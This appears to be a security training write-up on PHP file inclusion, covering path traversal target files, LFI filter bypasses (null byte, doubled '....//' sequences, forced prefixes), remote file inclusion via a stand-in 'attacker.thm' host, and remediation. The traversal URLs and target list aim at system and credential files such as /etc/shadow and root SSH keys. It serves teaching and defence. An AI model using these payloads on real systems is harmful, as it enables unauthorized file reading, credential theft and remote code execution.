**Why Do File Inclusion Vulnerabilites Happen?**
- The root cause is insufficient input validation.

#### Common Target Files

When testing for path traversal, it helps to know which files are worth going after. The table below lists some commonly targeted files on both Linux and Windows systems.

| Location                      | Description                                                                                                       |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `/etc/issue`                  | Contains a message or system identification printed before the login prompt.                                      |
| `/etc/profile`                | Controls system-wide default variables, such as export variables, file creation mask (umask), and terminal types. |
| `/proc/version`               | Displays the version of the Linux kernel.                                                                         |
| `/etc/passwd`                 | Lists all registered users on the system.                                                                         |
| `/etc/shadow`                 | Contains hashed passwords for the system's users (requires elevated permissions to read).                         |
| `/root/.bash_history`         | Contains the command history for the root user.                                                                   |
| `/var/log/dmessage`           | Contains global system messages, including messages logged during system startup.                                 |
| `/var/mail/root`              | Contains all emails for the root user.                                                                            |
| `/root/.ssh/id_rsa`           | The private SSH key for the root user (or any known valid user on the server).                                    |
| `/var/log/apache2/access.log` | Logs all requests made to the Apache web server.                                                                  |
| `C:\boot.ini`                 | Contains boot options for Windows computers with BIOS firmware.                                                   |
### Local File Inclusion (LFI)

- Closely related to path traversal.
- But different from path traversal because it can exclude code passed through a file like PHP's `include()`, that executes any code inside a file before returning a output.
- In PHP, the function mostly responsible for LFI are `include`, `require`, `include_once`, `require_once`.

## Scenario 3: Black-Box Testing and Appended Extensions

When you don't have access to the source code, error messages become your best friend. Suppose we have the following entry point:

```url
http://webapp.thm/index.php?lang=EN
```

If we enter something invalid like `THM`, the server returns an error:

```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

This single error message reveals two critical pieces of information. First, the `include()` function is prepending `languages/` and appending `.php` to our input, meaning valid input is expected to be just a filename like `EN` which resolves to `languages/EN.php`. Second, the full path of the web application on disk is `/var/www/html/THM-4/`.

Knowing the full path tells us exactly how many `../` sequences we need. Since the application sits four levels deep (`/var/www/html/THM-4/`), we try:

```url
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

But we still get an error:

```php
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

We successfully traversed out of the application directory, but the `.php` extension is still being appended, so the server is looking for `/etc/passwd.php` instead of `/etc/passwd`. To bypass this, we can use a **null byte** (`%00`):

```url
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

A null byte tells the underlying C functions to stop processing the string at that point. Everything after it, including the `.php` extension, is ignored. The `include()` call effectively becomes:

```php
include("languages/../../../../etc/passwd");
```

**Important:** The null byte trick was patched in PHP 5.3.4 and above. You won't find it on modern PHP installations, but it still appears in older legacy applications.


## Scenario 4: Keyword Filtering with Path Bypass

Some developers try to block access to specific files by filtering known paths like `/etc/passwd`. When a filter is in place, there are a couple of ways to get around it.

One approach is to append `/.` or `/..` to the end of the path. If we request `/etc/passwd/.`, the operating system resolves `.` (current directory) and still returns `/etc/passwd`. Similarly, `/etc/passwd/..` resolves to `/etc/`, but more usefully, we can combine this with the null byte technique:

```url
http://webapp.thm/index.php?lang=/etc/passwd%00
http://webapp.thm/index.php?lang=/etc/passwd/.
```

The filter checks the input and doesn't find an exact match for its blocked string because of the trailing characters, but the file system still resolves the path to the file we want.

## Scenario 5: Stripping `../` from Input

Another common defence is to strip `../` sequences from user input. Let's see what happens when we try a standard traversal:

```url
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

The error message tells the story:

```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

The `../` sequences have been completely removed, leaving us with `languages/etc/passwd`. The filter is doing a single-pass replacement, stripping every occurrence of `../` from our input. The bypass here is to double up the traversal sequence so that when the inner `../` is removed, a valid `../` is left behind:

```php
....//....//....//....//....//etc/passwd
```

When the filter removes `../` from each `....//`, it leaves `../` intact:

![](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1772620541004.png)

This works because the filter only makes a single pass over the string. It finds and removes `../`, but doesn't check the result again.

## Scenario 6: Forced Directory Prefix

In this final scenario, the developer forces the input to start with a specific directory. The application expects something like:

```url
http://webapp.thm/index.php?lang=languages/EN.php
```

If the required directory isn't present in the input, the request is rejected. To exploit this, we simply include the expected directory at the start of our payload and then traverse out of it:

```url
http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
```

The application sees that the input starts with `languages/` and allows it through. The `../` sequences then do the rest.


## Remote File Inclusion

So far we've looked at vulnerabilities where the attacker includes files that already exist on the server. Remote File Inclusion (RFI) takes things a step further: instead of pointing the `include()` function at a local file, the attacker points it at a file hosted on a server they control. The target application fetches that remote file and executes it, giving the attacker code execution on the server.

This makes RFI significantly more dangerous than LFI in most cases. With LFI, the attacker is limited to files that already exist on the target. With RFI, the attacker controls the content of the file entirely, which means they can execute arbitrary code without needing to find a way to write files to the server first.

## Requirements for RFI

RFI relies on the PHP configuration option `allow_url_fopen` (and in some cases `allow_url_include`) being enabled. When this is turned on, functions like `include()` and `require()` can accept URLs as input, not just local file paths. This setting is enabled by default in many PHP installations, which is why RFI remains a common finding.

## Consequences of a Successful RFI Attack

The most critical outcome is Remote Code Execution (RCE), but a successful RFI attack can also lead to:

- Sensitive information disclosure
- Cross-Site Scripting (XSS)
- Denial of Service (DoS)

## How an RFI Attack Works

Let's walk through a typical RFI attack step by step.

![](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1772620556838.png)

**1. The attacker prepares a malicious file on their own server.**

For example, they might create a simple PHP file called `cmd.txt` hosted at `http://attacker.thm/cmd.txt`:

```php
<?PHP echo "Hello THM"; ?>
```

In a real attack this would contain something far more dangerous, like a web shell or a reverse shell payload, but the principle is the same.

**2. The attacker injects the URL into the vulnerable parameter.**

If the target application has a vulnerable `include()` call, the attacker sends a request like:

```url
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```

**3. The target server fetches the remote file.**

Because `allow_url_fopen` is enabled, the `include()` function sends a GET request to `http://attacker.thm/cmd.txt` and retrieves its contents.

**4. The attacker's server responds with the malicious file.**

The attacker's server sends back the contents of cmd.txt to the target application, just like any normal HTTP response.

**5. The target server executes the file.**

The contents of `cmd.txt` are passed through the PHP interpreter as if they were a local file. In our example, the page would display **Hello THM**. In a real attack, the attacker would now have code execution on the server.

The key takeaway is that the attacker never needs to upload anything to the target. They host the payload on their own infrastructure and let the vulnerable application do the rest.


## Remediation

Now that we've seen how file inclusion vulnerabilities are exploited, let's look at the other side of the coin. If you're building or maintaining a web application, what can you do to prevent these issues?

There is no single fix that covers every case. A strong defence combines secure coding practices with server-level configuration. Below are the key measures you should consider.

## Validate and Sanitise User Input

This is the most important step. Never pass raw user input into file-handling functions like `include()`, `require()`, or `file_get_contents()`. If your application needs to load files based on user input, use an allowlist (sometimes called a whitelist) of permitted filenames and reject anything that doesn't match. For example, if a user should only be able to select a language file, map the input to a fixed set of known values rather than using it directly in a file path:

```php
<?PHP
    $allowed = ['en' => 'languages/EN.php', 'ar' => 'languages/AR.php'];
    $lang = $_GET['lang'] ?? 'en';
    if (array_key_exists($lang, $allowed)) {
        include($allowed[$lang]);
    }
?>
```

This way, the user never controls the actual file path.

## Disable Unnecessary PHP Features

If your application does not need to include remote files, disable `allow_url_fopen` and `allow_url_include` in your `php.ini` configuration. This completely shuts down RFI as an attack vector:

```ini
allow_url_fopen = Off
allow_url_include = Off
```

Similarly, restrict the protocols and PHP wrappers that your application can use. If you don't need `php://`, `data://`, or `expect://`, disable them.

## Turn Off Detailed Error Messages in Production

As we saw in the LFI tasks, error messages can reveal the full file path of the application, the names of functions being used, and the structure of the file system. In a production environment, set `display_errors` to `Off` in `php.ini` and log errors to a file instead:

```ini
display_errors = Off
log_errors = On
```

This denies attackers the information they need to fine-tune their payloads.

## Keep Software Up to Date

Ensure your operating system, web server, PHP version, and any frameworks or libraries are kept up to date. Many file inclusion techniques (such as the null byte bypass) have been patched in newer versions of PHP. Running outdated software leaves you exposed to vulnerabilities that have known, public exploits.

## Deploy a Web Application Firewall (WAF)

A WAF can detect and block common file inclusion payloads like `../` sequences, null bytes, and URLs in parameters. It is not a replacement for secure code, but it adds a useful layer of defence, especially against automated scanning tools.

## Summary

The table below brings all of these measures together:

|Measure|What It Prevents|
|---|---|
|Input validation with an allowlist|Blocks arbitrary file paths and traversal sequences from reaching file-handling functions.|
|Disable `allow_url_fopen` / `allow_url_include`|Eliminates RFI entirely by preventing `include()` from fetching remote URLs.|
|Disable detailed error messages|Stops attackers from learning the application's directory structure and internal function calls.|
|Keep software updated|Removes known vulnerabilities such as the null byte bypass (patched in PHP 5.3.4).|
|Web Application Firewall|Provides an additional detection layer against common traversal and inclusion payloads.|